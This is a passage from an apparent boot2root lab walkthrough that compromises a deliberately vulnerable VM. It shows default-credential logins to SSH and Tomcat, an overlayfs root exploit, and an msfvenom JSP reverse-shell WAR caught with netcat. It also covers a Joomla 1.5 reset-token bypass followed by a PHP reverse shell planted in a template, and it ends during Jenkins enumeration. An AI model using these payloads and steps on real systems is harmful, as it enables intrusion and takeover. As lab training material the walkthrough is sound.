</span><span class='line'>1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
</span><span class='line'>|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
</span><span class='line'>|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
</span><span class='line'>|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)</span></code></pre></td></tr></table></div></figure>


<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/issue
</span><span class='line'>Ubuntu 14.04.3 LTS \n \l</span></code></pre></td></tr></table></div></figure>


<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin@canyoupwnme:~$ ./overlayfs 
</span><span class='line'>root@canyoupwnme:~# id
</span><span class='line'>uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
</span><span class='line'>root@canyoupwnme:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h2>Redis</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>6379/tcp  open  redis       Redis key-value store 3.0.7</span></code></pre></td></tr></table></div></figure>


<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>

<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
Sentinel and automatic partitioning with Redis Cluster</p></blockquote>

<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>redis-cli -h
</span><span class='line'>redis-cli 4.0.2
</span><span class='line'>
</span><span class='line'>Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
</span><span class='line'>  -h &lt;hostname&gt;      Server hostname (default: 127.0.0.1).
</span><span class='line'>  -p &lt;port&gt;          Server port (default: 6379).
</span><span class='line'>  -s &lt;socket&gt;        Server socket (overrides hostname and port).
</span><span class='line'>  -a &lt;password&gt;      Password to use when connecting to the server.
</span><span class='line'>  -r &lt;repeat&gt;        Execute specified command N times.
</span><span class='line'>  -i &lt;interval&gt;      When -r is used, waits &lt;interval&gt; seconds per command.
</span><span class='line'>                     It is possible to specify sub-second times like -i 0.1.
</span><span class='line'>  -n &lt;db&gt;            Database number.
</span><span class='line'>  -x                 Read last argument from STDIN.
</span><span class='line'>  -d &lt;delimiter&gt;     Multi-bulk delimiter in for raw formatting (default: \n).
</span><span class='line'>  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
</span><span class='line'>  --raw              Use raw formatting for replies (default when STDOUT is
</span><span class='line'>                     not a tty).
</span><span class='line'>  --no-raw           Force formatted output even when STDOUT is not a tty.
</span><span class='line'>  --csv              Output in CSV format.
</span><span class='line'>  --stat             Print rolling stats about server: mem, clients, ...
</span><span class='line'>  --latency          Enter a special mode continuously sampling latency.
</span><span class='line'>                     If you use this mode in an interactive session it runs
</span><span class='line'>                     forever displaying real-time stats. Otherwise if --raw or
</span><span class='line'>                     --csv is specified, or if you redirect the output to a non
</span><span class='line'>                     TTY, it samples the latency for 1 second (you can use
</span><span class='line'>                     -i to change the interval), then produces a single output
</span><span class='line'>                     and exits.
</span><span class='line'>  --latency-history  Like --latency but tracking latency changes over time.
</span><span class='line'>                     Default time interval is 15 sec. Change it using -i.
</span><span class='line'>  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.
</span><span class='line'>                     Default time interval is 1 sec. Change it using -i.
</span><span class='line'>  --lru-test &lt;keys&gt;  Simulate a cache workload with an 80-20 distribution.
</span><span class='line'>  --slave            Simulate a slave showing commands received from the master.
</span><span class='line'>  --rdb &lt;filename&gt;   Transfer an RDB dump from remote server to local file.
</span><span class='line'>  --pipe             Transfer raw Redis protocol from stdin to server.
</span><span class='line'>  --pipe-timeout &lt;n&gt; In --pipe mode, abort with error if after sending all data.
</span><span class='line'>                     no reply is received within &lt;n&gt; seconds.
</span><span class='line'>                     Default timeout: 30. Use 0 to wait forever.
</span><span class='line'>  --bigkeys          Sample Redis keys looking for big keys.
</span><span class='line'>  --scan             List all keys using the SCAN command.
</span><span class='line'>  --pattern &lt;pat&gt;    Useful with --scan to specify a SCAN pattern.
</span><span class='line'>  --intrinsic-latency &lt;sec&gt; Run a test to measure intrinsic system latency.
</span><span class='line'>                     The test will run for the specified amount of seconds.
</span><span class='line'>  --eval &lt;file&gt;      Send an EVAL command using the Lua script at &lt;file&gt;.
</span><span class='line'>  --ldb              Used with --eval enable the Redis Lua debugger.
</span><span class='line'>  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, in
</span><span class='line'>                     this mode the server is blocked and script changes are
</span><span class='line'>                     are not rolled back from the server memory.
</span><span class='line'>  --help             Output this help and exit.
</span><span class='line'>  --version          Output version and exit.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  cat /etc/passwd | redis-cli -x set mypasswd
</span><span class='line'>  redis-cli get mypasswd
</span><span class='line'>  redis-cli -r 100 lpush mylist x
</span><span class='line'>  redis-cli -r 100 -i 1 info | grep used_memory_human:
</span><span class='line'>  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3
</span><span class='line'>  redis-cli --scan --pattern '*:12345*'
</span><span class='line'>
</span><span class='line'>  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)
</span><span class='line'>
</span><span class='line'>When no command is given, redis-cli starts in interactive mode.
</span><span class='line'>Type "help" in interactive mode for information on available commands
</span><span class='line'>and settings.</span></code></pre></td></tr></table></div></figure>


<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>redis-cli -h 192.168.217.128
</span><span class='line'>192.168.217.128:6379&gt; help
</span><span class='line'>redis-cli 4.0.2
</span><span class='line'>To get help about Redis commands type:
</span><span class='line'>      "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
</span><span class='line'>      "help &lt;command&gt;" for help on &lt;command&gt;
</span><span class='line'>      "help &lt;tab&gt;" to get a list of possible help topics
</span><span class='line'>      "quit" to exit
</span><span class='line'>
</span><span class='line'>To set redis-cli preferences:
</span><span class='line'>      ":set hints" enable online hints
</span><span class='line'>      ":set nohints" disable online hints
</span><span class='line'>Set your preferences in ~/.redisclirc
</span><span class='line'>192.168.217.128:6379&gt; info
</span><span class='line'># Server
</span><span class='line'>redis_version:3.0.7
</span><span class='line'>redis_git_sha1:00000000
</span><span class='line'>redis_git_dirty:0
</span><span class='line'>redis_build_id:aa70bcb321ba8313
</span><span class='line'>redis_mode:standalone
</span><span class='line'>os:Linux 3.19.0-25-generic i686
</span><span class='line'>arch_bits:32
</span><span class='line'>multiplexing_api:epoll
</span><span class='line'>gcc_version:4.8.4
</span><span class='line'>process_id:1263
</span><span class='line'>run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
</span><span class='line'>tcp_port:6379
</span><span class='line'>uptime_in_seconds:3235
</span><span class='line'>uptime_in_days:0
</span><span class='line'>hz:10
</span><span class='line'>lru_clock:2368010
</span><span class='line'>config_file:/etc/redis/6379.conf
</span><span class='line'>
</span><span class='line'># Clients
</span><span class='line'>connected_clients:1
</span><span class='line'>client_longest_output_list:0
</span><span class='line'>client_biggest_input_buf:0
</span><span class='line'>blocked_clients:0
</span><span class='line'>
</span><span class='line'># Memory
</span><span class='line'>used_memory:637624
</span><span class='line'>used_memory_human:622.68K
</span><span class='line'>used_memory_rss:8929280
</span><span class='line'>used_memory_peak:637624
</span><span class='line'>used_memory_peak_human:622.68K
</span><span class='line'>used_memory_lua:24576
</span><span class='line'>mem_fragmentation_ratio:14.00
</span><span class='line'>mem_allocator:jemalloc-3.6.0
</span><span class='line'>
</span><span class='line'># Persistence
</span><span class='line'>loading:0
</span><span class='line'>rdb_changes_since_last_save:0
</span><span class='line'>rdb_bgsave_in_progress:0
</span><span class='line'>rdb_last_save_time:1512314215
</span><span class='line'>rdb_last_bgsave_status:ok
</span><span class='line'>rdb_last_bgsave_time_sec:-1
</span><span class='line'>rdb_current_bgsave_time_sec:-1
</span><span class='line'>aof_enabled:0
</span><span class='line'>aof_rewrite_in_progress:0
</span><span class='line'>aof_rewrite_scheduled:0
</span><span class='line'>aof_last_rewrite_time_sec:-1
</span><span class='line'>aof_current_rewrite_time_sec:-1
</span><span class='line'>aof_last_bgrewrite_status:ok
</span><span class='line'>aof_last_write_status:ok
</span><span class='line'>
</span><span class='line'># Stats
</span><span class='line'>total_connections_received:2
</span><span class='line'>total_commands_processed:2
</span><span class='line'>instantaneous_ops_per_sec:0
</span><span class='line'>total_net_input_bytes:41
</span><span class='line'>total_net_output_bytes:6067614
</span><span class='line'>instantaneous_input_kbps:0.00
</span><span class='line'>instantaneous_output_kbps:0.00
</span><span class='line'>rejected_connections:0
</span><span class='line'>sync_full:0
</span><span class='line'>sync_partial_ok:0
</span><span class='line'>sync_partial_err:0
</span><span class='line'>expired_keys:0
</span><span class='line'>evicted_keys:0
</span><span class='line'>keyspace_hits:0
</span><span class='line'>keyspace_misses:0
</span><span class='line'>pubsub_channels:0
</span><span class='line'>pubsub_patterns:0
</span><span class='line'>latest_fork_usec:0
</span><span class='line'>migrate_cached_sockets:0
</span><span class='line'>
</span><span class='line'># Replication
</span><span class='line'>role:master
</span><span class='line'>connected_slaves:0
</span><span class='line'>master_repl_offset:0
</span><span class='line'>repl_backlog_active:0
</span><span class='line'>repl_backlog_size:1048576
</span><span class='line'>repl_backlog_first_byte_offset:0
</span><span class='line'>repl_backlog_histlen:0
</span><span class='line'>
</span><span class='line'># CPU
</span><span class='line'>used_cpu_sys:3.71
</span><span class='line'>used_cpu_user:1.60
</span><span class='line'>used_cpu_sys_children:0.00
</span><span class='line'>used_cpu_user_children:0.00
</span><span class='line'>
</span><span class='line'># Cluster
</span><span class='line'>cluster_enabled:0
</span><span class='line'>
</span><span class='line'># Keyspace
</span><span class='line'>192.168.217.128:6379&gt; </span></code></pre></td></tr></table></div></figure>


<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>

<h2>Tomcat default credentials</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Potentially risky methods: PUT DELETE
</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
</span><span class='line'>|_http-title: Apache Tomcat</span></code></pre></td></tr></table></div></figure>


<p>Time to look at that Tomcat server!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h http://192.168.217.128:8080/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.217.128
</span><span class='line'>+ Target Hostname:    192.168.217.128
</span><span class='line'>+ Target Port:        8080
</span><span class='line'>+ Start Time:         2017-12-03 12:21:45 (GMT-5)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache-Coyote/1.1
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</span><span class='line'>+ /: Appears to be a default Apache Tomcat install.
</span><span class='line'>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
</span><span class='line'>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
</span><span class='line'>+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
</span><span class='line'>+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
</span><span class='line'>+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
</span><span class='line'>+ /manager/status: Tomcat Server Status interface found (pass protected)
</span><span class='line'>+ 7661 requests: 0 error(s) and 14 item(s) reported on remote host
</span><span class='line'>+ End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>

<p><img class="center" src="/images/pentest/kevgir/manager-fullpage.png" title="manager" alt="tomcat web application manager"></p>

<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
</span><span class='line'>Payload size: 1099 bytes
</span><span class='line'>Final size of war file: 1099 bytes
</span><span class='line'>Saved as: runme.war</span></code></pre></td></tr></table></div></figure>


<p>Check what&rsquo;s inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jar -tf runme.war 
</span><span class='line'>WEB-INF/
</span><span class='line'>WEB-INF/web.xml
</span><span class='line'>kndeoavjwgjs.jsp</span></code></pre></td></tr></table></div></figure>


<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
</span><span class='line'>whoami
</span><span class='line'>tomcat7</span></code></pre></td></tr></table></div></figure>


<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>

<h2>Joomla</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-generator: Joomla! 1.5 - Open Source Content Management
</span><span class='line'>| http-robots.txt: 14 disallowed entries 
</span><span class='line'>| /administrator/ /cache/ /components/ /images/ 
</span><span class='line'>| /includes/ /installation/ /language/ /libraries/ /media/ 
</span><span class='line'>|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Welcome to the Frontpage</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/pentest/kevgir/8081.jpg" title="joomla" alt="joomla"></p>

<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>* The Exact version found is 1.5.1
</span><span class='line'># 15
</span><span class='line'>Info -&gt; CoreComponent: Joomla Remote Admin Password Change Vulnerability 
</span><span class='line'>Versions Affected: 1.5.5 &lt;= 
</span><span class='line'>Check: /components/com_user/controller.php
</span><span class='line'>Exploit: 1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm  2. Write into field "token" char ' and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password 
</span><span class='line'>Vulnerable? Yes</span></code></pre></td></tr></table></div></figure>


<p>This vulnerability is tracked under CVE-2008-3681:</p>

<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>

<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>

<p><img class="center" src="/images/pentest/kevgir/token.jpg" title="token" alt="password reset bypass"></p>

<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>

<p><img class="center" src="/images/pentest/kevgir/joomla.jpg" title="joomla" alt="joomla"></p>

<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>

<p><img class="center" src="/images/pentest/kevgir/template.jpg" title="template" alt="joomla template"></p>

<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
</span><span class='line'> 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>


<h2>Jenkins</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>9000/tcp  open  http        Jetty winstone-2.9
</span><span class='line'>| http-robots.txt: 1 disallowed entry 
</span><span class='line'>|_/
</span><span class='line'>|_http-server-header: Jetty(winstone-2.9)
</span><span class='line'>|_http-title: Dashboard [Jenkins]</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/pentest/kevgir/jenkins.jpg" title="jenkins" alt="jenkins dashboard"></p>

<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>

<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
tasks related to building, testing, and delivering or deploying software.</p></blockquote>

<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(jenkins_enum) &gt; info
</span><span class='line'>
</span><span class='line'>       Name: Jenkins-CI Enumeration
</span><span class='line'>     Module: auxiliary/scanner/http/jenkins_enum
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Normal
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>  Jeff McCutchan
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>  Name       Current Setting  Required  Description
</span><span class='line'>  ----       ---------------  --------  -----------
</span><span class='line'>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>  RHOSTS                      yes       The target address range or CIDR identifier
</span><span class='line'>  RPORT      80               yes       The target port (TCP)
</span><span class='line'>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
</span><span class='line'>  THREADS    1                yes       The number of concurrent threads
</span><span class='line'>  VHOST                       no        HTTP server virtual host
</span><span class='line'>
